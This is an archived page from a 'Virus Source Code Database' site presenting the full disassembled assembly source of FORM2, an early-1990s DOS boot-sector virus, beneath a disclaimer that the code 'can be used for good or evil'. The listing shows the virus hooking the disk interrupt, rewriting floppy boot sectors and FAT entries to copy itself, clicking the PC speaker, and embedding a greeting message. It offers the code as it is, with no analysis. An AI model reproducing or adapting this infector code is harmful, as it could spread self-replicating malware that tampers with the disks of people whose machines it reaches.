<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: form2_asm</title>
<meta name="KEYWORDS" content="form2.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for form2.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="faces_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/faces_asm.php">faces_asm</a><br>
<a href="fade_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fade_asm.php">fade_asm</a><br>
<a href="faerie_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/faerie_asm.php">faerie_asm</a><br>
<a href="fat_fuck_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fat_fuck_asm.php">fat_fuck_asm</a><br>
<a href="fatman__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fatman__asm.php">fatman__asm</a><br>
<a href="fatman_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fatman_asm.php">fatman_asm</a><br>
<a href="femifbia_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/femifbia_pas.php">femifbia_pas</a><br>
<a href="ffire_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/ffire_asm.php">ffire_asm</a><br>
<a href="firecide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/firecide_asm.php">firecide_asm</a><br>
<a href="firecris_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/firecris_asm.php">firecris_asm</a><br>
<a href="firecrpt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/firecrpt_asm.php">firecrpt_asm</a><br>
<a href="firefly_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/firefly_asm.php">firefly_asm</a><br>
<a href="fish___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fish___asm.php">fish___asm</a><br>
<a href="fish__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fish__asm.php">fish__asm</a><br>
<a href="fish_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fish_asm.php">fish_asm</a><br>
<a href="flagyll_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flagyll_asm.php">flagyll_asm</a><br>
<a href="flagyllz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flagyllz_asm.php">flagyllz_asm</a><br>
<a href="flip2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flip2_asm.php">flip2_asm</a><br>
<a href="flip_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flip_asm.php">flip_asm</a><br>
<a href="flu_not_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flu_not_asm.php">flu_not_asm</a><br>
<a href="flu_not_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flu_not_c.php">flu_not_c</a><br>
<a href="fmt12_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fmt12_asm.php">fmt12_asm</a><br>
<a href="fonetone_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fonetone_asm.php">fonetone_asm</a><br>
<a href="foo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/foo_asm.php">foo_asm</a><br>
<a href="form2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/form2_asm.php">form2_asm</a><br>
<a href="formvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/formvir_asm.php">formvir_asm</a><br>
<a href="fri_13th_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fri_13th_asm.php">fri_13th_asm</a><br>
<a href="friday13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/friday13_asm.php">friday13_asm</a><br>
<a href="friday_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/friday_asm.php">friday_asm</a><br>
<a href="frog_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/frog_asm.php">frog_asm</a><br>
<a href="froggie_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/froggie_pas.php">froggie_pas</a><br>
<a href="frtfly_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/frtfly_asm.php">frtfly_asm</a><br>
<a href="fruitfl2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fruitfl2_asm.php">fruitfl2_asm</a><br>
<a href="fruitfly_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fruitfly_asm.php">fruitfly_asm</a><br>
<a href="fruitful_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fruitful_asm.php">fruitful_asm</a><br>
<a href="fumanchu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fumanchu_asm.php">fumanchu_asm</a><br>
<a href="fun_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fun_asm.php">fun_asm</a><br>
<a href="funked_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/funked_asm.php">funked_asm</a><br>
<a href="funkybom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/funkybom_asm.php">funkybom_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>


PAGE  59,132

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл								         лл
;лл			        FORM2				         лл
;лл								         лл
;лл      Created:   12-Mar-92					         лл
;лл      Version:						         лл
;лл      Code type: zero start					         лл
;лл      Passes:    9	       Analysis Options on: OQRS	         лл
;лл								         лл
;лл								         лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;
;
; FORM - virus cont. 
;                          head  = 1
;			   sec   = 4 (original boot sector = 5)
;                          cyl   = 1
;
;                       ( 720kb )
;
.286c


seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	0

form2		proc	far

start:
		pop	di
		test	word ptr [bx+si],0FFF0h
		jnz	loc_1			; Jump if not zero
		or	word ptr [bx+si],0FF70h
		jmp	short loc_2		; (0024)
loc_1:						;  xref 91AF:0005
		add	si,2
		inc	di
		cmp	di,word ptr ds:[5]	; (91AF:0005=675h)
		jae	loc_5			; Jump if above or =
		cmp	si,200h
		jb	$-2Eh			; Jump if below
		sub	si,200h
		inc	cx
		jmp	short $-3Fh
loc_2:						;  xref 91AF:000B
		mov	al,byte ptr ds:[10h]	; (91AF:0010=47h)
		mov	byte ptr ds:[7],al	; (91AF:0007=81h)
loc_3:						;  xref 91AF:004F
		mov	ax,302h
		cmp	si,1FFh
		je	loc_4			; Jump if equal
		dec	ax
loc_4:						;  xref 91AF:0031
		pushf				; Push flags
		call	dword ptr ds:[41h]	; (91AF:0041=0F6C1h)
		jc	loc_5			; Jump if carry Set
		add	cl,byte ptr ds:[16h]	; (91AF:0016=49h)
		dec	cx
		mov	ax,cx
		div	byte ptr ds:[18h]	; (91AF:0018=0FEh) al,ah rem = ax/data
		mov	cl,ah
		mov	dh,al
		inc	cx
		dec	byte ptr ds:[7]		; (91AF:0007=81h)
		jnz	loc_3			; Jump if not zero
		mov	ax,di
		mov	cl,byte ptr ds:[0Dh]	; (91AF:000D=83h)
		dec	cx
		shl	ax,cl			; Shift w/zeros fill
		add	ax,word ptr ds:[3]	; (91AF:0003=0FFF0h)
		clc				; Clear carry flag
		retn
loc_5:						;  xref 91AF:0015, 0039
		stc				; Set carry flag
		retn

form2		endp

;пппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппп
;			       SUBROUTINE
;
;         Called from:	 91AF:00C5, 00DE
;мммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммм

sub_1		proc	near
		mov	bl,byte ptr ds:[18h]	; (91AF:0018=0FEh)
		mov	bh,bl
		mov	cl,byte ptr ds:[1Ah]	; (91AF:001A=2)
		dec	cx
		shl	bl,cl			; Shift w/zeros fill
		div	bl			; al, ah rem = ax/reg
		mov	ch,al
		xor	dh,dh			; Zero register
		cmp	ah,bh
		jb	loc_6			; Jump if below
		sub	ah,bh
		mov	dh,1
loc_6:						;  xref 91AF:0077
		inc	ah
		mov	cl,ah
		retn
sub_1		endp


;пппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппп
;			       SUBROUTINE
;
;         Called from:	 91AF:0157
;мммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммм

sub_2		proc	near
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	es
		push	ds
		push	cs
		pop	ds
		push	cs
		pop	es
		mov	bx,3F9h
		xor	dh,dh			; Zero register
		mov	cx,3

locloop_7:					;  xref 91AF:00A5
		push	cx
		mov	ax,201h
		mov	cx,1
		pushf				; Push flags
		call	dword ptr ds:[41h]	; (91AF:0041=0F6C1h)
		pop	cx
		jnc	loc_9			; Jump if carry=0
		loop	locloop_7		; Loop if cx > 0

loc_8:						;  xref 91AF:00B0, 00B7
		jmp	loc_11			; (013F)
loc_9:						;  xref 91AF:00A3
		cmp	word ptr [bx+3Fh],0FE01h
		nop				;*ASM fixup - displacement
		je	loc_8			; Jump if equal
		cmp	word ptr [bx+0Bh],200h
		jne	loc_8			; Jump if not equal
		call	$-128h
		call	$-10Eh
		call	$-0EAh
		jc	loc_11			; Jump if carry Set
		push	ax
		call	sub_1			; (0062)
		mov	word ptr ds:[4Dh],cx	; (91AF:004D=7)
		mov	word ptr ds:[4Fh],dx	; (91AF:004F=0D975h)
		pop	ax
		inc	ax
		cmp	byte ptr ds:[0Dh],2	; (91AF:000D=83h)
		je	loc_10			; Jump if equal
		call	$-104h
		jc	loc_11			; Jump if carry Set
loc_10:						;  xref 91AF:00D7
		call	sub_1			; (0062)
		mov	word ptr ds:[49h],cx	; (91AF:0049=41F0h)
		mov	word ptr ds:[4Bh],dx	; (91AF:004B=0EFEh)
		mov	ax,201h
		mov	bx,3F9h
		mov	cx,1
		xor	dh,dh			; Zero register
		pushf				; Push flags
		call	dword ptr ds:[41h]	; (91AF:0041=0F6C1h)
		jc	loc_11			; Jump if carry Set
		mov	ax,301h
		mov	cx,word ptr ds:[49h]	; (91AF:0049=41F0h)
		mov	dx,word ptr ds:[4Bh]	; (91AF:004B=0EFEh)
		mov	byte ptr ds:[4Bh],0	; (91AF:004B=0FEh)
		pushf				; Push flags
		call	dword ptr ds:[41h]	; (91AF:0041=0F6C1h)
		jc	loc_11			; Jump if carry Set
		mov	ax,301h
		mov	bx,1FEh
		mov	cx,word ptr ds:[4Dh]	; (91AF:004D=7)
		mov	dx,word ptr ds:[4Fh]	; (91AF:004F=0D975h)
		mov	byte ptr ds:[4Fh],0	; (91AF:004F=75h)
		pushf				; Push flags
		call	dword ptr ds:[41h]	; (91AF:0041=0F6C1h)
		jc	loc_11			; Jump if carry Set
		call	$-19Bh
		mov	bx,3F9h
		mov	ax,301h
		mov	cx,1
		xor	dh,dh			; Zero register
		pushf				; Push flags
		call	dword ptr ds:[41h]	; (91AF:0041=0F6C1h)
loc_11:						;  xref 91AF:00A7, 00C2, 00DC, 00F9
						;            0110, 012A
		pop	ds
		pop	es
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		retn
sub_2		endp

		cmp	dl,80h
		jae	loc_12			; Jump if above or =
		cmp	ah,2
		jne	loc_12			; Jump if not equal
		cmp	ch,0
		jne	loc_12			; Jump if not equal
		call	sub_2			; (0082)
loc_12:						;  xref 91AF:014B, 0150, 0155
		jmp	dword ptr cs:[41h]	; (91AF:0041=0F6C1h)
		push	ax
		in	al,61h			; port 61h, 8255 port B, read
		mov	ah,al
		or	al,3
		out	61h,al			; port 61h, 8255 B - spkr, etc
		push	cx
		mov	cx,1000h

locloop_13:					;  xref 91AF:016C
		loop	locloop_13		; Loop if cx > 0

		pop	cx
		mov	al,ah
		out	61h,al			; port 61h, 8255 B - spkr, etc
						;  al = 0, disable parity
		pop	ax
		jmp	dword ptr cs:[45h]	; (91AF:0045=8A00h)
		db	'The FORM-Virus sends greetings t'





		db	'o everyone who', 27h, 's reading'



		db	' this text.FORM doesn', 27h, 't '



		db	'destroy data! Don', 27h, 't pani'



		db	'c! Fuckings go to Corinne.'




		db	0EBh, 3Ch, 90h, 47h, 45h,0EBh
		db	'<GEOWORKS'

		db	 00h, 02h, 02h, 01h, 00h, 02h
		db	 70h, 00h,0A0h, 05h,0F9h, 03h
		db	 00h, 09h, 00h, 02h, 00h
		db	8 dup (0)
		db	 01h, 00h, 29h,0B7h, 26h, 00h
		db	 00h
		db	'-R-        '

		db	8 dup (0)
		db	0E8h, 00h, 00h

;пппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппп
;			       SUBROUTINE
;мммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммм

sub_3		proc	near
		pop	si
		add	si,11h
loc_14:						;  xref 91AF:024E
		lodsb				; String [si] to al
		or	al,al			; Zero ?
		jz	loc_15			; Jump if zero
		mov	ah,0Eh
		int	10h			; Video display   ah=functn 0Eh
						;  write char al, teletype mode
		jmp	short loc_14		; (0245)
loc_15:						;  xref 91AF:0248, 0250
		jmp	short loc_15		; (0250)
sub_3		endp

		db	'This disk is not bootable.', 0Dh




		db	0Ah, 'System HALTED', 0Dh, 0Ah


		db	385 dup (0)
		db	 55h,0AAh

seg_a		ends



		end	start

ББББББББББББББББББББ CROSS REFERENCE - KEY ENTRY POINTS БББББББББББББББББББ

    seg:off    type	   label
   ---- ----   ----   ---------------
   91AF:0000   far    start

 ББББББББББББББББББ Interrupt Usage Synopsis ББББББББББББББББББ

        Interrupt 10h :	 write char al, teletype mode

 ББББББББББББББББББ I/O	Port Usage Synopsis  ББББББББББББББББББ

        Port 61h   : 8255 port B, read
        Port 61h   : 8255 B - spkr, etc


</textarea></td></tr></table></body></html>
